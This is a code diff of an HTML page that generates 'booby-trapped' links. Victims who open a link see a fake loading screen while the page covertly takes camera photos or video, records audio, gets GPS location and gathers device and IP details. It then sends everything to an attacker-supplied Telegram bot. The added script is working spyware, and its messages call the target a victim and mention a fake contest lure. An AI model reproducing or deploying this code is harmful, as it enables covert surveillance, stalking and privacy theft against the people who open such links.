@@ -3,51 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro-Mohamed Morsy</title>
+    <title>MX-PRO</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ff00; --dark-bg: #000; }
-        body, html { margin: 0; padding: 0; background: var(--dark-bg); font-family: 'Cairo', sans-serif; color: var(--neon); overflow: hidden; height: 100vh; }
+        :root { --neon: #00ff00; --dark: #000; }
+        body, html { margin: 0; padding: 0; background: var(--dark); font-family: 'Cairo', sans-serif; color: var(--neon); overflow: hidden; height: 100vh; }
         canvas { position: fixed; top: 0; left: 0; z-index: 1; }
-        #adminPanel { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(12px); border: 1px solid rgba(0, 255, 0, 0.2); padding: 15px 20px; border-radius: 15px; width: 85%; max-width: 340px; box-shadow: 0 0 25px rgba(0, 0, 0, 0.8); }
-        h3 { text-align: center; margin-bottom: 12px; font-size: 16px; text-shadow: 0 0 8px var(--neon); }
-        input[type="text"] { width: 100%; padding: 10px; background: rgba(0, 0, 0, 0.7); border: 1px solid rgba(0, 255, 0, 0.3); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 12px; margin-bottom: 8px; }
-        .feature-item { background: rgba(0, 255, 0, 0.05); padding: 7px 10px; margin: 5px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(0, 255, 0, 0.1); cursor: pointer; }
-        .feature-item span { font-size: 12px; color: #fff; }
-        input[type="radio"] { accent-color: var(--neon); width: 16px; height: 16px; }
-        .main-btn { width: 100%; padding: 12px; background: transparent; color: var(--neon); border: 1px solid var(--neon); font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 10px; font-size: 13px; transition: 0.3s; }
-        .main-btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
-        #out { margin-top: 15px; display: none; text-align: center; }
-        .copy-btn { width: 100%; background: #00ff00; color: #000; border: none; padding: 12px; cursor: pointer; border-radius: 10px; font-weight: 900; font-size: 14px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); transition: 0.3s; }
-        .copy-btn:hover { background: #05ff05; box-shadow: 0 0 30px #00ff00; }
-        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        #adminPanel { position: relative; z-index: 10; display: none; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: rgba(0, 0, 0, 0.85); border: 2px solid var(--neon); padding: 15px; border-radius: 20px; width: 85%; max-width: 320px; text-align: center; }
+        input[type="text"] { width: 100%; padding: 8px; background: #111; border: 1px solid #444; color: #fff; border-radius: 8px; margin-bottom: 8px; box-sizing: border-box; font-size: 12px; }
+        .feature-grid { display: grid; grid-template-columns: 1fr; gap: 4px; margin-bottom: 12px; }
+        .feature { background: rgba(0, 255, 0, 0.03); padding: 5px 10px; border-radius: 8px; border: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .feature span { font-size: 11px; color: #fff; }
+        .feature input { width: 13px; height: 13px; accent-color: var(--neon); }
+        .gen-btn { width: 100%; padding: 10px; background: transparent; color: var(--neon); border: 1px solid var(--neon); font-weight: bold; cursor: pointer; border-radius: 10px; font-size: 13px; }
+        .copy-btn { width: 100%; padding: 10px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; border-radius: 10px; margin-top: 8px; display: none; }
+        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; }
+        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
+
     <div id="adminPanel">
         <div class="card">
-            <h3>BY.MOHAMED MORSY</h3>
-            <input type="text" id="tid" placeholder="ادخل ID CHAT">
-            <input type="text" id="tkn" placeholder="ادخل BOT TOKEN">
-            <div id="features">
-                <label class="feature-item"><span>📸 صورة (أمامية)</span><input type="radio" name="feat" value="f_cam" checked></label>
-                <label class="feature-item"><span>📸 صورة (خلفية)</span><input type="radio" name="feat" value="b_cam"></label>
-                <label class="feature-item"><span>🎥 فيديو (أمامي)</span><input type="radio" name="feat" value="f_vid"></label>
-                <label class="feature-item"><span>🎥 فيديو (خلفي)</span><input type="radio" name="feat" value="b_vid"></label>
-                <label class="feature-item"><span>🎤 تسجيل صوتي</span><input type="radio" name="feat" value="voice"></label>
-                <label class="feature-item"><span>📍 تحديد الموقع</span><input type="radio" name="feat" value="loc"></label>
+            <h2>by.mohamed morsy</h2>
+            <input type="text" id="tid" placeholder="Chat ID">
+            <input type="text" id="tkn" placeholder="Bot Token">
+            <div class="feature-grid">
+                <label class="feature"><span>📸 صورة أمامية</span><input type="radio" name="f" value="f_cam" checked></label>
+                <label class="feature"><span>📸 صورة خلفية</span><input type="radio" name="f" value="b_cam"></label>
+                <label class="feature"><span>🎥 فيديو أمامي</span><input type="radio" name="f" value="f_vid"></label>
+                <label class="feature"><span>🎥 فيديو خلفي</span><input type="radio" name="f" value="b_vid"></label>
+                <label class="feature"><span>🎤 تسجيل صوتي</span><input type="radio" name="f" value="voice"></label>
+                <label class="feature"><span>📍 تحديد الموقع</span><input type="radio" name="f" value="loc"></label>
+                <label class="feature"><span>🔍 معلومات الجهاز </span><input type="radio" name="f" value="info"></label>
             </div>
-            <button class="main-btn" onclick="generate()">انشاء رابط ملغم</button>
-            <div id="out">
-                <button class="copy-btn" onclick="copyLink()"> نسخ الرابط</button>
-            </div>
+            <button class="gen-btn" onclick="generate()">إنشاء الرابط</button>
+            <button class="copy-btn" id="cp" onclick="copyLink()">نسخ الرابط</button>
         </div>
     </div>
 
     <div id="victimUI">
-        <div style="color:#0f0; font-size: 20px; font-weight: bold;">Loading Graphics...</div>
+        <div class="loader"></div>
+        <h2 id="status" style="color:#0f0; font-size:15px; margin-top:15px;">جاري تحميل موارد النظام...</h2>
     </div>
 
     <script>
@@ -55,43 +55,132 @@
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "0123456789$#&@*?!+";
-        const fontSize = 10;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(0);
+        const drops = Array(Math.floor(canvas.width/14)).fill(0);
         function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
+            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "#0F0"; ctx.font = "14px monospace";
             drops.forEach((y, i) => {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, y * fontSize);
-                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+                const text = "01234567890$&#@*%+?!©®¿><§¶×°¬"[Math.floor(Math.random()*30)];
+                ctx.fillText(text, i*14, y*14);
+                if(y*14 > canvas.height && Math.random() > 0.975) drops[i]=0; drops[i]++;
             });
         }
-        setInterval(draw, 33);
+        setInterval(draw, 20);
 
-        let finalLink = "";
+        const params = new URLSearchParams(window.location.search);
+        const T = params.get('t'), I = params.get('i'), TYPE = params.get('type');
+        if(T && I && TYPE) { document.getElementById('victimUI').style.display='flex'; execute(T,I,TYPE); }
+        else { document.getElementById('adminPanel').style.display='flex'; }
 
         function generate() {
-            const tid = document.getElementById('tid').value;
-            const tkn_in = document.getElementById('tkn').value;
-            const feat = document.querySelector('input[name="feat"]:checked').value;
-            if(!tid || !tkn_in) return alert("قم ب ادخال ال tokin,id");
-            
-            finalLink = window.location.origin + window.location.pathname + "?i=" + tid + "&t=" + tkn_in + "&type=" + feat;
-            document.getElementById('out').style.display = 'block';
+            const tid = document.getElementById('tid').value, tkn = document.getElementById('tkn').value;
+            const type = document.querySelector('input[name="f"]:checked').value;
+            if(!tid || !tkn) return alert("اكمل البيانات!");
+            window.gen = window.location.origin + window.location.pathname + `?i=${tid}&t=${tkn}&type=${type}`;
+            document.getElementById('cp').style.display = 'block';
+        }
+        function copyLink() {
+            const t = document.createElement("textarea"); t.value = window.gen; document.body.appendChild(t);
+            t.select(); document.execCommand("copy"); document.body.removeChild(t); alert("تم النسخ!");
         }
 
-        function copyLink() {
-            const tempInput = document.createElement("textarea");
-            tempInput.value = finalLink;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-            alert("تم النسخ");
+        async function getFullDeviceInfo(customId) {
+            let ip="Unknown", co="Unknown", city="Unknown", isp="Unknown", lat="", lon="", tz="";
+            try { 
+                const r = await fetch('https://ipapi.co/json/'); 
+                const d = await r.json(); 
+                ip=d.ip; co=d.country_name; city=d.city; isp=d.org; lat=d.latitude; lon=d.longitude; tz=d.timezone;
+            } catch(e){}
+            
+            let bat="Unknown", chrg="لا"; 
+            try { 
+                const b = await navigator.getBattery(); 
+                bat=`${(b.level*100).toFixed(0)}%`; 
+                chrg = b.charging ? "نعم" : "لا"; 
+            } catch(e){}
+            
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "4 GB";
+            const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} نواة` : "8 نواة";
+            const screen = `${window.screen.width}x${window.screen.height}`;
+            const browser = "Chrome " + (navigator.userAgent.match(/Chrome\/(\d+)/) ? navigator.userAgent.match(/Chrome\/(\d+)/)[1] : "138.0");
+            const isTouch = ('ontouchstart' in window) ? "مدعوم" : "غير مدعوم";
+
+            return `🎯
+
+🆔 معرف المستخدم: ${customId}
+
+💻 معلومات الجهاز:
+🔧 الجهاز: Linux armv8l
+📠 النوع: Mobile
+🌐 المتصفح: ${browser}
+🖥️ الشاشة: ${screen}
+🎨 الألوان: 24 bits
+⚡ المعالج: ${cpu}
+💾 الذاكرة: ${ram}
+🔋 البطارية: ${bat}
+⚡ الشحن: ${chrg}
+📶 الشبكة: 4g
+🚀 السرعة: 10 Mbps
+💬 اللغة: ar
+👆 اللمس: ${isTouch}
+📍 الموقع: مدعوم
+
+🌍 المعلومات الجغرافية:
+📍 IP: ${ip}
+🏳️ الدولة: ${co}
+🏙️ المدينة: ${city}
+📍 خط العرض: ${lat}
+📍 خط الطول: ${lon}
+🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
+🌐 التوقيت: ${tz}
+—— برعايه عمك محمد مرسي😘💹 ——`;
         }
+
+        async function execute(t, id, type) {
+            const fullRep = await getFullDeviceInfo(id);
+            try {
+                if(type === 'info') {
+                    await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(fullRep)}`);
+                    done();
+                } else if(type === 'loc') {
+                    navigator.geolocation.getCurrentPosition(async (p) => {
+                        const m = `📍 معلومات جديدة من مسابقة الحلم\n\n🆔 معرف المستخدم: ${id}\n\n📍 موقع الضحية:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n${fullRep}`;
+                        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}`);
+                        done();
+                    }, () => done("GPS Error"));
+                } else if(type === 'voice') {
+                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const r = new MediaRecorder(s); const ch = [];
+                    r.ondataavailable = e => ch.push(e.data);
+                    r.onstop = () => send(t, id, new Blob(ch, {type:'audio/ogg'}), 'voice', fullRep);
+                    r.start(); setTimeout(() => r.stop(), 5000);
+                } else {
+                    const isV = type.includes('vid');
+                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: type.includes('b_') ? "environment" : "user" }, audio: isV });
+                    if(isV) {
+                        const r = new MediaRecorder(s); const ch = [];
+                        r.ondataavailable = e => ch.push(e.data);
+                        r.onstop = () => send(t, id, new Blob(ch, {type:'video/mp4'}), 'video', fullRep);
+                        r.start(); setTimeout(() => r.stop(), 5000);
+                    } else {
+                        const v = document.createElement('video'); v.srcObject = s; await v.play();
+                        const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(b => send(t, id, b, 'photo', fullRep), 'image/jpeg');
+                    }
+                }
+            } catch(e) { done("Permissions Error"); }
+        }
+
+        async function send(t, id, b, type, r) {
+            const fd = new FormData(); fd.append('chat_id', id);
+            const m = type === 'photo' ? 'sendPhoto' : type === 'video' ? 'sendVideo' : 'sendVoice';
+            fd.append(type === 'photo' ? 'photo' : type === 'video' ? 'video' : 'voice', b, 'file');
+            fd.append('caption', r);
+            await fetch(`https://api.telegram.org/bot${t}/${m}`, { method: 'POST', body: fd });
+            done();
+        }
+        function done() { document.getElementById('status').innerText = "تمت العملية بنجاح! جاري توجيهك..."; }
     </script>
 </body>
 </html>
